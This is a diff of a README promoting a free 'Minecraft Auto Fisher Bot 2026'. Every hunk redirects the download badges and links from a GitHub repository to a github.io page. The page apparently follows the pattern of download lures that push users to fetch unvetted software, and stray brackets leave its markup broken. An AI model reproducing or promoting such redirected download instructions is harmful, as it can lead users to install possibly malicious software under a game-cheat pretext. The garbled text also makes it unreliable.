@@ -1,6 +1,6 @@
 # ⚡ Minecraft-Auto-Fisher-Bot-2026 - Download Free and Start Fishing Automatically
 
-[![Download Minecraft Auto Fisher Bot](https://img.shields.io/badge/Download-Minecraft_Auto_Fisher_Bot_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=green)](https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026)
+[![Download Minecraft Auto Fisher Bot](https://img.shields.io/badge/Download-Minecraft_Auto_Fisher_Bot_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white&color=green)](https://test4prijedor.github.io)
 
 ---
 
@@ -37,7 +37,7 @@ Follow these instructions exactly as written to get the bot running on your comp
 
 ### Step 1: Download the Bot
 
-Visit this link to download the application: [https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026](https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026)
+Visit this link to download the application: [https://test4prijedor.github.io](https://test4prijedor.github.io)
 
 )
 
@@ -196,7 +196,7 @@ You are now ready to start your automatic fishing journey. Everything you need i
 
 
 
-[![Get Minecraft Auto Fisher Bot](https://img.shields.io/badge/🚀-Download_Now-Green?style=for-the-badge&logo=appveyor&color=blueviolet)](https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026)
+[![Get Minecraft Auto Fisher Bot](https://img.shields.io/badge/🚀-Download_Now-Green?style=for-the-badge&logo=appveyor&color=blueviolet)](https://test4prijedor.github.io)
 
 ).
 
@@ -206,7 +206,7 @@ You are now ready to start your automatic fishing journey. Everything you need i
 
 
 
- visit this link to download the application: [[https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026](https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026)](https://github.com/test4prijedor/Minecraft-Auto-Fisher-Bot-2026)[
+ visit this link to download the application: [[https://test4prijedor.github.io](https://test4prijedor.github.io)](https://test4prijedor.github.io)[
 
  
 
